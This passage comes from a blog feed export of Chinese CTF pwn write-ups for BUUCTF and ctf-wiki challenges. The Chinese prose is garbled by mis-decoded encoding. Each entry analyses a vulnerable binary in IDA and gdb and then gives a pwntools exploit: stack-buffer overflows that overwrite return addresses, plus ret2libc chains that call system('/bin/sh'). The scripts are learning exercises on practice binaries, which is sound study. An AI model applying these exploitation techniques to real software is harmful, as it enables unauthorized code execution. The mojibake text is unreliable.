<h3 id="0x02-IDA"><a href="#0x02-IDA" class="headerlink" title="0x02 IDA"></a>0x02 IDA</h3><p>f5åæ±‡ç¼–ï¼Œmainå‡½æ•°é‡Œæœ‰ä¸€ä¸ªgets()å‡½æ•°<br><img data-src="https://pic3.zhimg.com/80/v2-19fc3d1ed197677ec860d87f4d328756_1440w.webp"><br>çœ‹åˆ°è¿”å›ä¸€ä¸ªgets()å‡½æ•°ï¼Œå¯åˆ©ç”¨æ ˆæº¢å‡º<br><del>ä½†æ˜¯è¿™ä¸ªä¸¤ä¸ªå‚æ•°çš„getså‡½æ•°æ²¡æœ‰çœ‹æ‡‚â€¦â€¦</del><br><del>é‚£ä¸ªwriteå’Œsprintfå‡½æ•°ä¹Ÿæ²¡çœ‹æ‡‚â€¦â€¦</del><br>shift+f12è°ƒå‡ºstring window æŸ¥çœ‹å­—ç¬¦ä¸²ï¼Œè™½ç„¶æ²¡æœ‰&#x2F;bin&#x2F;shï¼Œä½†æ˜¯æ‰¾åˆ°äº†ä¸€ä¸ªcat flag.txtï¼Œåº”è¯¥å¯ä»¥åˆ©ç”¨<br><img data-src="https://pic1.zhimg.com/80/v2-a9342c39cccfcb08151c10e52d33d7f8_1440w.webp"><br>åŒå‡»cat flag.txtè¿›å»çœ‹çœ‹ï¼ŒXä¸€ä¸‹å‘ç°æ˜¯åœ¨sub_40060Då‡½æ•°é‡Œï¼Œåæ±‡ç¼–å†çœ‹ä¸€ä¸‹å‘ç°æˆ‘ä»¬æƒ³è¦çš„systemï¼ˆï¼‰å°±åœ¨è¿™ï¼Œè‹¥èƒ½è°ƒç”¨å®ƒçš„è¯å°±èƒ½ç›´æ¥å‘½ä»¤æŠ“å–flagäº†å‘€<br><img data-src="https://pic3.zhimg.com/80/v2-8439007eace8a199836ffba7ed7ae65e_1440w.webp"><br><img data-src="https://pic3.zhimg.com/80/v2-f6878b5ead1b0c9e36cf46e11b1b73c2_1440w.webp"><br>æ¥ä¸‹æ¥å°±æ˜¯è®°ä¸‹sub_40060Då‡½æ•°çš„åœ°å€0x40060D,å¹¶å°†å…¶ä½œä¸ºæº¢å‡ºçš„è¿”å›åœ°å€ï¼ˆä¹Ÿå¯ä»¥è®°æŠŠåç§»é‡å‹å…¥å¯„å­˜å™¨é‚£æ¡æ±‡ç¼–æŒ‡ä»¤å¤„çš„åœ°å€0x40011ï¼‰<br><img data-src="https://pic1.zhimg.com/80/v2-ea795c3163730c1428cdeb16c15eabfc_1440w.webp"><br>åˆå› ä¸ºè¦getsçš„v5çš„å¤§å°ä¸º0x40hï¼Œæ‰€ä»¥ä¸è¿”å›åœ°å€çš„è·ç¦»æ˜¯0x40+8ï¼ˆrbpçš„é•¿åº¦ï¼‰<br><img data-src="https://pic3.zhimg.com/80/v2-78a46c31edfbcab05ff353e3e624996a_1440w.webp"><br><img data-src="https://pic2.zhimg.com/80/v2-feaba2ae58e8a0cf0161837933d1fe29_1440w.webp"><br><img data-src="https://pic1.zhimg.com/80/v2-244c60af51681873d600771f879d5c00_1440w.webp"></p>
<h3 id="0x03-exp"><a href="#0x03-exp" class="headerlink" title="0x03 exp"></a>0x03 exp</h3><p>å†™å‡ºexploit</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">p = remote(&#x27;node4.buuoj.cn&#x27;,25916)</span><br><span class="line">payload=&#x27;a&#x27;*(0x40+8)+p64(0x400611)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>å¾—åˆ°flag<br><img data-src="https://pic4.zhimg.com/80/v2-e3375ccc43536a0178b679606bfaa1eb_1440w.webp"></p>
<h3 id="0x04-thinking"><a href="#0x04-thinking" class="headerlink" title="0x04 thinking"></a>0x04 thinking</h3><p>è¿™é¢˜è·Ÿä¸Šä¸€é¢˜ä¸€æ ·ï¼Œéƒ½æ˜¯æ ˆæº¢å‡ºï¼Œéƒ½æ˜¯å°†æŸä¸ªåé—¨å‡½æ•°çš„åœ°å€è¦†ç›–æ‰è¿”å›åœ°å€<br>ä¸€å¼€å§‹æ²¡ååº”è¿‡æ¥cat flag.txtå¯ä»¥ç›´æ¥ç”¨ï¼Œè¿˜åœ¨é‚£æ‰¾&#x2F;bin&#x2F;sh,<br>è¿˜æ˜¯å¯¹ä¿¡æ¯ä¸å¤ªæ•æ„Ÿâ€¦â€¦<br>ä¸è¿‡å¯¹æ ˆçš„ç›¸å…³çŸ¥è¯†çš„å­¦ä¹ è¿˜æ˜¯è®©äººæ„Ÿè§‰æœ‰æ”¶è·çš„</p>
]]></content>
      <categories>
        <category>wp</category>
      </categories>
      <tags>
        <tag>ctf</tag>
        <tag>BUUCTF</tag>
      </tags>
  </entry>
  <entry>
    <title>week1 T4</title>
    <url>/posts/235b49d6/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h2 id="T4-ciscn-2019-n-1"><a href="#T4-ciscn-2019-n-1" class="headerlink" title="T4 ciscn_2019_n_1"></a>T4 ciscn_2019_n_1</h2><blockquote>
<p>2023-01-08WP<br>BUUCTF pwnç¬¬å››é¢˜</p>
</blockquote>
<span id="more"></span>

<h3 id="0x01"><a href="#0x01" class="headerlink" title="0x01"></a>0x01</h3><p>å…ˆ<strong>fileï¼Œchekcsec</strong>â€”â€”64-bitï¼Œå¼€å¯<strong>NX</strong><br><img data-src="https://pic2.zhimg.com/80/v2-fcbfe99feb2a92abc72a297e219777e9_1440w.webp"></p>
<h3 id="0x02"><a href="#0x02" class="headerlink" title="0x02"></a>0x02</h3><p><strong>IDA</strong>ä¸­mainå‡½æ•°æ²¡å•¥æœ‰ç”¨çš„ï¼Œçœ‹åˆ°è¿˜æœ‰ä¸€ä¸ªfunå‡½æ•°<br><img data-src="https://pic2.zhimg.com/80/v2-ba42478d6dfc7d2b91ba248e835a4429_1440w.webp"><br>ç‚¹è¿›å»çœ‹å‘ç°æœ‰ä¸ªgetså‡½æ•°ï¼Œå¯èƒ½å­˜åœ¨æ ˆæº¢å‡ºï¼ŒåŒæ—¶å‘ç°if ( v2 &#x3D;&#x3D; 11.28125 )æ—¶è°ƒç”¨systemå‡½æ•°ï¼Œæ‰€ä»¥æƒ³åˆ°è¾“å…¥æ¥ä½¿v2çš„å€¼ç­‰äº11.28125<br>ä½†æ˜¯getsè¯»å…¥çš„æ—¶v1è€Œä¸æ˜¯v2ï¼Œæ‰€ä»¥åˆæƒ³åˆ°è®©v1æº¢å‡ºï¼Œä½¿æº¢å‡ºçš„å€¼ä¸º11.28125å¹¶è®©å®ƒæˆä¸ºv2çš„å€¼<br>äºæ˜¯è¿›å»æŸ¥çœ‹v1v2çš„åœ°å€<br><img data-src="https://pic3.zhimg.com/80/v2-f9dc01951802e4c151cf6ddd0fdd1eee_1440w.webp"><br><img data-src="https://pic4.zhimg.com/80/v2-f90e4938ab553be25f298598c50e7d03_1440w.webp"><br>è®¡ç®—å¾—é•¿åº¦ä¸º44h</p>
<h3 id="0x03"><a href="#0x03" class="headerlink" title="0x03"></a>0x03</h3><p><strong>exp</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">p=remote(&#x27;node4.buuoj.cn&#x27;,25907)</span><br><span class="line">payload=b&quot;a&quot;*44+p64(0x41348000)#0x41348000æ˜¯11.28125çš„åå…­è¿›åˆ¶æ•°</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()          </span><br></pre></td></tr></table></figure>
<p><del>ç›´æ¥å†™11.28125å¥½åƒæ²¡ç”¨â€¦â€¦</del><br><img data-src="https://pic1.zhimg.com/80/v2-c5edce340e57ef721fc68134243ee168_1440w.webp"><br>ç½‘ä¸Šçœ‹åˆ°ä¸€ç¯‡<a href="https://blog.csdn.net/qq_41560595/article/details/108783758">åšå®¢</a>æ˜¯ç›´æ¥ä»IDAä¸­æ‰¾åå…­è¿›åˆ¶æ•°çš„<br>pwnå¾—flag<br>è¿˜æœ‰ä¸€ç§æ–¹æ³•å°±æ˜¯ç›´æ¥è¦†ç›–v1v2ï¼Œè®©è¿”å›åœ°å€æŒ‡å‘è°ƒç”¨systemå‡½æ•°çš„åœ°å€0x4006BE<br><img data-src="https://pic4.zhimg.com/80/v2-cf387e39d529bbf5bdf92c02f6064f97_1440w.webp"><br>è¿™å°±è®©æˆ‘æœ‰<strong>ä¸€äº›ç–‘æƒ‘ï¼š</strong>å°±è¿™ä¸€é¢˜æ¥è¯´ï¼Œå¼€å¯äº†NXæœ‰æ²¡æœ‰è®©é¢˜ç›®éš¾åº¦å¢åŠ å‘¢ï¼Ÿ</p>
]]></content>
      <categories>
        <category>wp</category>
      </categories>
      <tags>
        <tag>ctf</tag>
        <tag>BUUCTF</tag>
      </tags>
  </entry>
  <entry>
    <title>week1 T5</title>
    <url>/posts/545c7940/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h2 id="T5-pwn1-sctf-2016"><a href="#T5-pwn1-sctf-2016" class="headerlink" title="T5 pwn1_sctf_2016"></a>T5 pwn1_sctf_2016</h2><blockquote>
<p>2023-01-09WP<br>BUUCTF pwnç¬¬äº”é¢˜</p>
</blockquote>
<span id="more"></span>

<h3 id="0x01"><a href="#0x01" class="headerlink" title="0x01"></a>0x01</h3><p>file checksecâ€”â€”32-bit,å¼€å¯NX<br><img data-src="https://pic3.zhimg.com/80/v2-746f7f97d1877dc7901815486c36d846_1440w.webp"></p>
<h3 id="0x02"><a href="#0x02" class="headerlink" title="0x02"></a>0x02</h3><p><strong>IDA</strong>ä¸­shift+f12å¯ä»¥æ‰¾åˆ°æœ‰ä¸ªcat flag.txt<br><img data-src="https://pic1.zhimg.com/80/v2-9d38aa862b9408f86802c4dca80493a4_1440w.webp"><br>å¯ä»¥åˆ©ç”¨è¿™ä¸ªå‡½æ•°æ¥è¾“å‡ºflag<br>æŸ¥çœ‹è°ƒç”¨å®ƒçš„å‡½æ•°å¹¶è®°ä¸‹å®ƒçš„åœ°å€0x8048F0D<br><img data-src="https://pic3.zhimg.com/v2-107e624689b731fc197a5f737bac2106_r.jpg"><br>ç»§ç»­å¯»æ‰¾èƒ½å¤Ÿæº¢å‡ºçš„å‡½æ•°ï¼Œåœ¨mainå‡½æ•°ä¸­çš„vulnå‡½æ•°é‡Œæœ‰fget()å‡½æ•°<br><img data-src="https://pic3.zhimg.com/80/v2-fc51095b6ef69a5c78254f87a3dcea9a_1440w.webp"><br>ä½†æ˜¯fgetå‡½æ•°é™åˆ¶äº†è¾“å…¥é•¿åº¦ä¸º32ï¼Œå¥½åƒå¹¶ä¸èƒ½æ„æˆæ ˆæº¢å‡º<br>äºæ˜¯æˆ‘å°±è’™äº†ï¼Œfgetåé¢çš„ä¼ªä»£ç åˆä¸æ˜¯çœ‹å¾—å¾ˆæ‡‚â€¦â€¦<br>æŸ¥äº†è®¸å¤šå¤§æ¦‚ç†è§£äº†æ˜¯åé¢çš„replaceå‡½æ•°å°†ä¸€ä¸ªå­—èŠ‚çš„iæ¢æˆäº†ä¸‰ä¸ªå­—èŠ‚çš„you<br>è¿™æ ·ä¸€æ¥æˆ‘ä»¬åªéœ€è¦è¾“å…¥20ä¸ªâ€˜Iâ€™ï¼Œreplaceåå°±ä¼šå˜æˆ60ä¸ªå­—èŠ‚çš„â€˜youâ€™,è¿™æ ·å°±èƒ½å¡«æ»¡é•¿åº¦ä¸º0x3Chçš„s<br>payloadå†è¦†ç›–æ‰ebpå†åŠ ä¸Šget_flagå‡½æ•°çš„åœ°å€å°±å¯ä»¥äº†<br>æœ€åçœ‹å¤§ä½¬åšå®¢åŠæ‡‚åŠä¸æ‡‚åœ°å†™äº†ä¸ªexp<br>ï¼ˆè¿™ç¯‡<a href="https://www.freebuf.com/vuls/336623.html">åšå®¢</a>æ„Ÿè§‰ç®—æ˜¯æ¯”è¾ƒè¯¦ç»†çš„ï¼Œå®ƒç”šè‡³æ˜¯ç›´æ¥åˆ†ææ±‡ç¼–è¯­è¨€ï¼‰</p>
<h3 id="0x03"><a href="#0x03" class="headerlink" title="0x03"></a>0x03</h3><p>exp</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">p = remote(&#x27;node4.buuoj.cn&#x27;, 28105)</span><br><span class="line">flag_addre = 0x08048F0D</span><br><span class="line">payload = b&#x27;I&#x27;*0x14+b&#x27;aaaa&#x27;+p32(flag_addre)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h3 id="0x04"><a href="#0x04" class="headerlink" title="0x04"></a>0x04</h3><p>è¿˜æ˜¯ä¸æ˜¯å¾ˆæ‡‚åˆ°åº•æ˜¯æ€ä¹ˆçœ‹å‡ºæ¥æ˜¯æŠŠiæ¢æˆyouçš„<br>è¿˜æœ‰å°±æ˜¯è¿™ä¸ªreplaceå‡½æ•°çš„å‚æ•°åˆ—è¡¨ä¸­é‚£ä¸ªv4ä»£è¡¨çš„æ˜¯ä»€ä¹ˆ<br><img data-src="https://pic3.zhimg.com/80/v2-cc78aea540c7bae381b3cfe547853dae_1440w.webp"><br>å¹¶æ²¡æœ‰åœ¨v4è¿™é‡Œå†™å…¥iæˆ–è€…youå‘€ï¼Œè¿™çŒœéƒ½ä¸å¥½çŒœæ˜¯æŠŠiæ¢æˆyouäº†<br><del>ç›´æ¥ç‚¹è¿›å»çœ‹replaceçš„æºç å¥½åƒåˆä¸ç§‘å­¦ï¼Œæ ¹æœ¬çœ‹ä¸æ‡‚â€¦â€¦</del><br>è¡¥å……ï¼šC++çš„ä¼ªä»£ç å°±æ˜¯æ¯”è¾ƒéš¾çœ‹ï¼Œä¸èƒ½åªçœ‹IDAäº†ï¼Œè¦ç»“åˆgdbè°ƒè¯•å»çŒœiæ¢æˆyouçš„æ›¿æ¢</p>
]]></content>
      <categories>
        <category>wp</category>
      </categories>
      <tags>
        <tag>ctf</tag>
        <tag>BUUCTF</tag>
      </tags>
  </entry>
  <entry>
    <title>week2 T2</title>
    <url>/posts/d88d430d/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h2 id="T2-ret2text-ä¸Šé¢˜çš„å¦ä¸€ç§è§£æ³•"><a href="#T2-ret2text-ä¸Šé¢˜çš„å¦ä¸€ç§è§£æ³•" class="headerlink" title="T2 ret2text(ä¸Šé¢˜çš„å¦ä¸€ç§è§£æ³•)"></a>T2 ret2text(ä¸Šé¢˜çš„å¦ä¸€ç§è§£æ³•)</h2><blockquote>
<p>2023-01-09WP<br>ç½‘ä¸Šçœ‹åˆ°å¦ä¸€ç§æš´åŠ›è§£æ³•æ„Ÿè§‰å¾ˆä¸é”™äºæ˜¯è‡ªå·±åšè¿‡äº†ä¸€é<br><strong>0x01</strong>ä¸<strong>0x02</strong>è·Ÿä¸Šé¢˜ç›¸åŒ</p>
</blockquote>
<span id="more"></span>

<h3 id="0x03"><a href="#0x03" class="headerlink" title="0x03"></a>0x03</h3><p>å¤§ä½“æ€è·¯å°±æ˜¯è¾“å…¥ä¸€å †æµ‹è¯•æ•°æ®ç„¶åè°ƒè¯•çœ‹åœ¨é‚£ä¸ªè¾“å…¥ç‚¹æŠ¥é”™äº†ï¼Œè¿™ä¸ªè¾“å…¥ç‚¹å°±æ˜¯åˆšå¥½æº¢å‡ºçš„é‚£ä¸ªç‚¹ï¼Œç„¶åè®¡ç®—åç§»é‡å³å¯<br>å…ˆç”¨cyclicç”Ÿæˆæœ‰åºå­—ç¬¦é˜Ÿåˆ—<br><img data-src="https://pic4.zhimg.com/80/v2-3a1996514eab734175f5c32518ac5dc7_1440w.webp"><br>è¿è¡Œå¹¶è¾“å…¥ç”Ÿæˆçš„å­—ç¬¦ä¸²<br><img data-src="https://pic4.zhimg.com/80/v2-e46dcabf469631f89dca3965244aacef_1440w.webp"><br>å¾—åˆ°invalid addres  0x62616164<br>ç”¨cyclic -læŸ¥æ‰¾åç§»é‡<br><img data-src="https://pic1.zhimg.com/80/v2-4c9106613db51cfa2abc68482b270b40_1440w.webp"></p>
<h3 id="0x04"><a href="#0x04" class="headerlink" title="0x04"></a>0x04</h3><p>å†™exp</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">io = process(&#x27;./ret2text&#x27;)</span><br><span class="line">success_addr = 0x0804863A</span><br><span class="line">payload = b&#x27;a&#x27; * 112  + p32(success_addr)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>wp</category>
      </categories>
      <tags>
        <tag>ctf</tag>
        <tag>ctf-wiki</tag>
      </tags>
  </entry>
  <entry>
    <title>week2 T4</title>
    <url>/posts/31eee638/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h2 id="T4-ret2libc2"><a href="#T4-ret2libc2" class="headerlink" title="T4 ret2libc2"></a>T4 ret2libc2</h2><blockquote>
<p>2023-01-09WP<br>ctf-wiki åŸºç¡€rop</p>
</blockquote>
<span id="more"></span>

<h3 id="0x01"><a href="#0x01" class="headerlink" title="0x01"></a>0x01</h3><p>file checksecâ€”â€”32-bitï¼Œå¼€å¯NX</p>
<h3 id="0x02"><a href="#0x02" class="headerlink" title="0x02"></a>0x02</h3><p>æ‹–å…¥IDAçœ‹çœ‹<br>å±é™©å‡½æ•°å’Œret2libc1ç›¸åŒéƒ½æ˜¯gets<br>ä¸åŒçš„æ˜¯è¿™æ¬¡æ²¡æœ‰&#x2F;bin&#x2F;shç»™æˆ‘ä»¬ç”¨äº†<del>æˆ‘è¿˜æ‰¾äº†å¥½ä¹…æ¥ç€â€¦â€¦</del><br>ä½†æ˜¯systemå‡½æ•°è¿˜æ˜¯æœ‰çš„<br>é‚£æˆ‘ä»¬å…ˆæ‰¾å‡ºsystemçš„åœ°å€0x08048490<br><img data-src="https://pic1.zhimg.com/80/v2-d7208c51601dfd63bece7bfa14f509f4_1440w.webp"><br>æ¥ä¸‹æ¥æˆ‘ä»¬å¾—æƒ³åŠæ³•å¼„å‡ºä¸ª&#x2F;bin&#x2F;shæ¥<br>ç”±äºç¨‹åºå·²ç»å¼€å¯NXä¿æŠ¤ï¼Œæˆ‘ä»¬æ— æ³•ç›´æ¥å†™å…¥æ ˆ<br>æ‰€ä»¥æ€è€ƒåœ¨bssæ®µå†™å…¥å­—ç¬¦ä¸²  è¯´å®è¯ï¼Œè¿™ä¸ªåœ°æ–¹ç¬¬ä¸€æ¬¡çœ‹çœŸçš„æ€ä¹ˆéƒ½æƒ³ä¸åˆ°â€¦â€¦<br>ç„¶åæ¥ä¸‹æ¥æˆ‘åˆä¸ä¼šäº†ï¼Œæ€ä¹ˆæ‰¾åˆ°bssâ€¦â€¦.åšå®¢ä¸Šå¥½å¤šæ–¹æ³•çœ‹å¾—æˆ‘å¤´æ™•ç›®çœ©ï¼Œåˆè¿˜ä¸ä¼šç”¨ROPgadgetâ€¦â€¦<br>æœ€åæˆ‘ç›´æ¥åœ¨IDAé‡Œå¿«æ·é”®Gäº†ä¸€ä¸‹è·³åˆ°äº†.bssæ®µ<br>å‘ç°é‡Œé¢æœ‰ä¸ªbuff2(è®¾è®¡å¥½äº†çš„å§ï¼Ÿ)ï¼Œæˆ‘ä»¬å¯ä»¥ç”¨getså‡½æ•°å†™å…¥&#x2F;bin&#x2F;shåˆ°buff2<br><img data-src="https://pic1.zhimg.com/80/v2-02c0edc80f9a8a5d0576827773403920_1440w.webp"><br>å»æ‰¾getsçš„åœ°å€  å¾—åˆ°0x8048460<br><img data-src="https://pic1.zhimg.com/80/v2-5ccf0533f58826d407436ee4665c121c_1440w.webp"></p>
<h3 id="0x03"><a href="#0x03" class="headerlink" title="0x03"></a>0x03</h3><p>ç”¨gdbæš´åŠ›æ±‚å‡ºåç§»é‡<br><img data-src="https://pic1-zhimg-com-s.atrust.sdu.edu.cn:81/80/v2-4c9106613db51cfa2abc68482b270b40_1440w.webp"><br>ç»ˆäºå¯ä»¥å†™expäº†</p>
<h3 id="0x04"><a href="#0x04" class="headerlink" title="0x04"></a>0x04</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">sh = process(&#x27;./ret2libc2&#x27;)</span><br><span class="line">gets_plt = 0x08048460</span><br><span class="line">system_plt = 0x08048490</span><br><span class="line">buf2 = 0x804a080</span><br><span class="line">payload = flat( [b&#x27;a&#x27; * 112, gets_plt,   system_plt, buf2,buf2])</span><br><span class="line">#å…ˆè¦†ç›–æº¢å‡ºï¼Œè¿”å›getså‡½æ•°çš„åœ°å€ï¼Œ</span><br><span class="line">#æ¥ç€è¿”å›æ‰§è¡Œsystemå‡½æ•°çš„åœ°å€ï¼Œç„¶åä¼ å…¥getså‡½æ•°å‚æ•°buf2çš„åœ°å€,systemå‡½æ•°çš„å‚æ•°buf2</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.sendline(&#x27;/bin/sh&#x27;)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
<p>è¿™ç¯‡<a href="https://zhuanlan.zhihu.com/p/53357764#:~:text=%E5%85%B6%E4%B8%AD%E5%85%B3%E9%94%AE%E7%9A%84%E4%BB%A3%E7%A0%81%E6%98%AF%EF%BC%9A%20payload%20%3D%20flat%20%28%5B%27a%27%20%2A%20112%2C%20gets_plt%2C,buf2%2C%20system_plt%2C%200xabcdabcd%2C%20buf2%5D%29%20%E7%9B%B8%E4%BF%A1%E6%9C%89%E7%9A%84%E6%9C%8B%E5%8F%8B%E4%BC%9A%E4%B8%8D%E6%98%8E%E7%99%BD%EF%BC%8C%E4%B8%BA%E5%95%A5%E6%9C%89%E4%B8%AA%20%5Bgets_plt%2C%20pop_ebp%2C%20buf2%5D%EF%BC%8C%E8%BF%99%E6%A0%B7%E7%9A%84payload%E5%B8%83%E7%BD%AE%E3%80%82">æ–‡ç« </a>å’Œè¿™ç¯‡<a href="https://www.jianshu.com/p/4928e726a43f">åšå®¢</a>æŒºä¸é”™çš„<br>è¿˜æœ‰<a href="https://blog.csdn.net/ATFWUS/article/details/104565483">è¿™ç¯‡</a></p>
<h3 id="0x05"><a href="#0x05" class="headerlink" title="0x05"></a>0x05</h3><p>ctf-wikiçš„expæ˜¯</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">##!/usr/bin/env python</span><br><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">sh = process(&#x27;./ret2libc2&#x27;)</span><br><span class="line"></span><br><span class="line">gets_plt = 0x08048460</span><br><span class="line">system_plt = 0x08048490</span><br><span class="line">pop_ebx = 0x0804843d</span><br><span class="line">buf2 = 0x804a080</span><br><span class="line">payload = flat(</span><br><span class="line">    [&#x27;a&#x27; * 112, gets_plt, pop_ebx, buf2, system_plt, 0xdeadbeef, buf2])</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.sendline(&#x27;/bin/sh&#x27;)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
<p>[â€˜aâ€™ * 112, gets_plt, pop_ebx, buf2, system_plt, 0xdeadbeef, buf2]ä¸ºå•¥è¿˜éœ€è¦ä¸€ä¸ª pop_ebxå‘¢ï¼Ÿ<br>å¥½åƒçœ‹åˆ°æœ‰åšå®¢è¯´æ˜¯ä¸ºäº†å †æ ˆå¹³è¡¡<br>å…¶å®å°±æ˜¯ç”¨äº†ä¸¤ä¸ªgadget<br>åœ¨è°ƒç”¨getså‡½æ•°åï¼ŒæŠŠå‚æ•°buf2ç»™popæ‰ï¼Œè¿™æ ·è¿”å›åœ°å€å°±å˜æˆäº†systemï¼Œå°±ä¼šè¿”å›åˆ°system</p>
]]></content>
      <categories>
        <category>wp</category>
      </categories>
      <tags>
        <tag>ctf</tag>
        <tag>ctf-wiki</tag>
      </tags>
  </entry>
  <entry>
    <title>week2 T3</title>
    <url>/posts/af8a739b/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h2 id="T3-ret2libc1"><a href="#T3-ret2libc1" class="headerlink" title="T3 ret2libc1"></a>T3 ret2libc1</h2><blockquote>
<p>2023-01-09WP<br>ctf-wiki åŸºç¡€rop</p>
</blockquote>
<span id="more"></span>

<h3 id="0x00-ctf-wikiä¸­çš„åŸç†è§£é‡Š"><a href="#0x00-ctf-wikiä¸­çš„åŸç†è§£é‡Š" class="headerlink" title="0x00  ctf-wikiä¸­çš„åŸç†è§£é‡Š"></a>0x00  ctf-wikiä¸­çš„åŸç†è§£é‡Š</h3><p>ret2libc å³æ§åˆ¶å‡½æ•°çš„æ‰§è¡Œ libc ä¸­çš„å‡½æ•°ï¼Œé€šå¸¸æ˜¯è¿”å›è‡³æŸä¸ªå‡½æ•°çš„ plt å¤„æˆ–è€…å‡½æ•°çš„å…·ä½“ä½ç½® (å³å‡½æ•°å¯¹åº”çš„ got è¡¨é¡¹çš„å†…å®¹)ã€‚ä¸€èˆ¬æƒ…å†µä¸‹ï¼Œæˆ‘ä»¬ä¼šé€‰æ‹©æ‰§è¡Œ system(â€œ&#x2F;bin&#x2F;shâ€)ï¼Œæ•…è€Œæ­¤æ—¶æˆ‘ä»¬éœ€è¦çŸ¥é“ system å‡½æ•°çš„åœ°å€ã€‚<br><strong>0x01</strong><br>file checksecâ€”â€”32-bitï¼Œå¼€å¯NX<br><img data-src="https://pic2.zhimg.com/80/v2-80ff23ddf6fa9ad28c2d42d4fbe68d4d_1440w.webp"></p>
<h3 id="0x02"><a href="#0x02" class="headerlink" title="0x02"></a>0x02</h3><p>IDAæŸ¥çœ‹æºç ï¼Œåº”è¯¥æ˜¯getså‡½æ•°çš„æ ˆæº¢å‡º<br><img data-src="https://pic2.zhimg.com/80/v2-5733f1e4a386a4ef5c7316035cb5a505_1440w.webp"><br>shift+f12çœ‹åˆ°æœ‰&#x2F;bin&#x2F;shå­—ç¬¦ä¸²,æ‰¾åœ°å€ä¸º0x08048720<br><img data-src="https://pic4.zhimg.com/80/v2-db2ae8bc45848b27958075060c1762db_1440w.webp"><br><img data-src="https://pic1.zhimg.com/80/v2-02907b4345d742100845714228c18270_1440w.webp"><br>å¹¶ä¸”åœ¨secureå‡½æ•°ä¸­æœ‰systemå‡½æ•°ï¼ŒåŒå‡»è¿›å»æŸ¥çœ‹å¾—åˆ° system å‡½æ•°åœ°å€ä¸º08048460<br><img data-src="https://pic4.zhimg.com/80/v2-d54eba26d72dbf06930f7d203b44307f_1440w.webp"></p>
<h3 id="0x03"><a href="#0x03" class="headerlink" title="0x03"></a>0x03</h3><p>gdbè°ƒè¯•æ‰¾åç§»é‡<br><img data-src="https://pic4-zhimg-com-s.atrust.sdu.edu.cn:81/80/v2-e46dcabf469631f89dca3965244aacef_1440w.webp"><br><img data-src="https://pic1-zhimg-com-s.atrust.sdu.edu.cn:81/80/v2-4c9106613db51cfa2abc68482b270b40_1440w.webp"><br><del>å¯èƒ½éƒ½æ˜¯ctf-wikié‡Œé¢çš„é¢˜çš„åŸå› å§è¿™é‡Œç”šè‡³è¿åç§»é‡éƒ½å’Œå‰é¢ret2textçš„ä¸€æ ·</del></p>
<h3 id="0x04"><a href="#0x04" class="headerlink" title="0x04"></a>0x04</h3><p>æˆ‘ä»¬è¦ç›´æ¥è¿”å›æ‰§è¡Œsystem å‡½æ•°ï¼Œexpå¯ä»¥è¿™æ ·å†™</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">sh = process(&#x27;./ret2libc1&#x27;)</span><br><span class="line">binsh_addr = 0x8048720</span><br><span class="line">system_addr = 0x08048460</span><br><span class="line">payload = flat([b&#x27;a&#x27; * 112, system_addr,b &#x27;b&#x27; * 4, binsh_addr])</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
<p>è¿™é‡Œçš„å››ä¸ªbæ˜¯systemå‡½æ•°çš„è¿”å›åœ°å€ï¼Œè¿™é‡Œåªæ˜¯èµ·åˆ°è®©ç»“æ„åˆæ³•çš„ä½œç”¨ï¼Œå…·ä½“æ˜¯ä»€ä¹ˆä¸é‡è¦ï¼Œå› ä¸ºæˆ‘ä»¬åªéœ€è¦è°ƒç”¨systemå°±è¡Œäº†<br><del>æˆ‘è¿™ä¸ªflatï¼ˆï¼‰è¿˜æŸ¥äº†å¥½ä¹…æ˜¯ä»€ä¹ˆæ„æ€â€¦â€¦å®é™…ä¸Šå°±æ˜¯æŠŠå‡ ä¸ªå­—ç¬¦ä¸²æ‹¼æ¥åœ¨ä¸€èµ·</del></p>
